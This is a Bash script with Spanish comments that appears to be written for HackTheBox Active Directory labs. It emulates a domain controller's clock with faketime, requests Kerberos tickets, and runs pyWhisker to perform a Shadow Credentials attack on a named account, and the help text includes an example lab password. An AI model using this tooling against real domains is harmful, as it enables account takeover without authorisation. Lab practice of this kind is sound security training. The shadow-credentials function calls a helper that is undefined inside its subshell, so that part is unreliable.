#!/bin/bash
# ============================================================
# Script Universal de Sincronización con faketime
# No modifica la hora del sistema, solo la emula
# Soporta: --tgt, --shadow, --exec
# ============================================================

# Colores
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m'

# Variables globales
DC_IP=""
DOMAIN=""
USER=""
PASSWORD=""
ACTION=""
TARGET=""
COMMAND=""
DC_TIME=""

# Uso
usage() {
    echo "Uso: $0 <DC_IP> <DOMAIN> [USER] [PASSWORD] [OPCIONES]"
    echo ""
    echo "OPCIONES:"
    echo "  --tgt                    Obtener TGT (Ticket Granting Ticket)"
    echo "  --shadow <target>        Realizar Shadow Credentials attack"
    echo "  --exec <comando>         Ejecutar comando con hora sincronizada"
    echo "  --show-time              Solo mostrar hora virtual"
    echo ""
    echo "Ejemplos:"
    echo "  $0 10.129.35.21 logging.htb                                    # Solo obtener hora"
    echo "  $0 10.129.35.21 logging.htb wallace.everette Welcome2026@      # Con usuario"
    echo "  $0 10.129.35.21 logging.htb svc_recovery pass --tgt            # Obtener TGT"
    echo "  $0 10.129.35.21 logging.htb svc_recovery pass --shadow msa_health$"
    echo "  $0 10.129.35.21 logging.htb svc_recovery pass --exec 'klist'"
    echo ""
    exit 1
}

# Verificar parámetros
if [ -z "$1" ] || [ -z "$2" ]; then
    usage
fi

DC_IP="$1"
DOMAIN="$2"
USER="$3"
PASSWORD="$4"

# Buscar opciones
shift 4
while [[ $# -gt 0 ]]; do
    case $1 in
        --tgt)
            ACTION="tgt"
            shift
            ;;
        --shadow)
            ACTION="shadow"
            TARGET="$2"
            shift 2
            ;;
        --exec)
            ACTION="exec"
            COMMAND="$2"
            shift 2
            ;;
        --show-time)
            ACTION="show-time"
            shift
            ;;
        *)
            echo -e "${RED}[!] Opción desconocida: $1${NC}"
            usage
            ;;
    esac
done

# Instalar faketime si no está
if ! command -v faketime &> /dev/null; then
    echo -e "${YELLOW}[*] Instalando faketime...${NC}"
    sudo apt install faketime -y
fi

# Función para obtener hora del DC
get_dc_time() {
    echo -e "${BLUE}[*] Obteniendo hora del DC: $DC_IP${NC}"
    
    # Método 1: ntpdate
    OFFSET=$(sudo ntpdate -q $DC_IP 2>&1 | grep -oP 'offset \K[+-]?\d+\.\d+' | head -1)
    
    if [ -n "$OFFSET" ]; then
        DC_TIME=$(date -d "+${OFFSET%.*} seconds" '+%Y-%m-%d %H:%M:%S')
        echo -e "${GREEN}[+] Hora DC (via NTP): $DC_TIME${NC}"
        return 0
    fi
    
    # Método 2: con usuario si se proporciona
    if [ -n "$USER" ] && [ -n "$PASSWORD" ]; then
        DC_TIME=$(ldapsearch -H ldap://$DC_IP -x -D "${DOMAIN}\\${USER}" -w "$PASSWORD" -s base -b "" currentTime 2>/dev/null | grep currentTime | awk '{print $2}' | sed 's/\.0Z$//' | sed 's/\(....\)\(..\)\(..\)\(..\)\(..\)\(..\)/\1-\2-\3 \4:\5:\6/')
        if [ -n "$DC_TIME" ]; then
            echo -e "${GREEN}[+] Hora DC (via LDAP): $DC_TIME${NC}"
            return 0
        fi
    fi
    
    # Método 3: offset por defecto
    echo -e "${YELLOW}[!] No se pudo obtener hora exacta, usando +7 horas${NC}"
    DC_TIME=$(date -d '+7 hours' '+%Y-%m-%d %H:%M:%S')
    return 0
}

# Función para configurar Kerberos
setup_kerberos() {
    cat > /tmp/krb5.conf << KRB
[libdefaults]
    default_realm = ${DOMAIN^^}
    dns_lookup_kdc = false
    dns_lookup_realm = false
    rdns = false
    clockskew = 300
[realms]
    ${DOMAIN^^} = {
        kdc = $DC_IP
        admin_server = $DC_IP
    }
[domain_realm]
    .$DOMAIN = ${DOMAIN^^}
    $DOMAIN = ${DOMAIN^^}
KRB
    export KRB5_CONFIG=/tmp/krb5.conf
}

# Función para obtener TGT
get_tgt() {
    echo -e "${BLUE}[*] Obteniendo TGT para $USER@${DOMAIN^^}${NC}"
    
    faketime "$DC_TIME" bash -c "
        setup_kerberos() {
            cat > /tmp/krb5.conf << KRB
[libdefaults]
    default_realm = ${DOMAIN^^}
    dns_lookup_kdc = false
[realms]
    ${DOMAIN^^} = {
        kdc = $DC_IP
    }
KRB
            export KRB5_CONFIG=/tmp/krb5.conf
        }
        setup_kerberos
        echo '$PASSWORD' | kinit $USER@${DOMAIN^^} 2>/dev/null
        if [ \$? -eq 0 ]; then
            echo -e '${GREEN}[+] TGT obtenido exitosamente${NC}'
            klist
            echo -e '${GREEN}[+] Ticket guardado en: /tmp/krb5cc_*${NC}'
        else
            echo -e '${RED}[-] Error al obtener TGT${NC}'
        fi
    "
}

# Función para Shadow Credentials
shadow_credentials() {
    if [ -z "$TARGET" ]; then
        echo -e "${RED}[!] Especifica el target para --shadow${NC}"
        exit 1
    fi
    
    echo -e "${BLUE}[*] Realizando Shadow Credentials attack${NC}"
    echo -e "${BLUE}[*] Target: $TARGET${NC}"
    echo -e "${BLUE}[*] User: $USER${NC}"
    
    faketime "$DC_TIME" bash -c "
        setup_kerberos
        export KRB5_CONFIG=/tmp/krb5.conf
        
        # Obtener TGT si no existe
        echo '$PASSWORD' | kinit $USER@${DOMAIN^^} 2>/dev/null
        
        # Ejecutar pyWhisker
        cd ~/htb/pyWhisker
        if [ -d \"venv\" ]; then
            source venv/bin/activate
        fi
        
        python3 pywhisker/pywhisker.py -d $DOMAIN -u $USER -p '$PASSWORD' \
            --target '$TARGET' --action add --dc-ip $DC_IP
    "
}

# Función para ejecutar comando
exec_command() {
    if [ -z "$COMMAND" ]; then
        echo -e "${RED}[!] Especifica el comando para --exec${NC}"
        exit 1
    fi
    
    echo -e "${BLUE}[*] Ejecutando comando con hora virtual: $DC_TIME${NC}"
    echo -e "${BLUE}[*] Comando: $COMMAND${NC}"
    
    faketime "$DC_TIME" bash -c "$COMMAND"
}

# Función principal
main() {
    # Obtener hora del DC
    get_dc_time
    
    echo -e "${BLUE}[*] Hora virtual a usar: $DC_TIME${NC}"
    echo -e "${BLUE}[*] Hora real del sistema: $(date)${NC}"
    echo ""
    
    # Ejecutar acción
    case $ACTION in
        tgt)
            setup_kerberos
            get_tgt
            ;;
        shadow)
            setup_kerberos
            shadow_credentials
            ;;
        exec)
            exec_command
            ;;
        show-time)
            echo -e "${GREEN}$DC_TIME${NC}"
            ;;
        *)
            echo -e "${GREEN}[+] Sincronización virtual completada${NC}"
            echo -e "${GREEN}[*] Usa: faketime '$DC_TIME' <comando>${NC}"
            echo ""
            echo -e "${YELLOW}Ejemplos de uso:${NC}"
            echo "  faketime '$DC_TIME' kinit $USER@${DOMAIN^^}"
            echo "  faketime '$DC_TIME' python3 pywhisker.py ..."
            echo ""
            echo -e "${BLUE}[*] Tiempo virtual: $DC_TIME${NC}"
            ;;
    esac
}

# Ejecutar
main
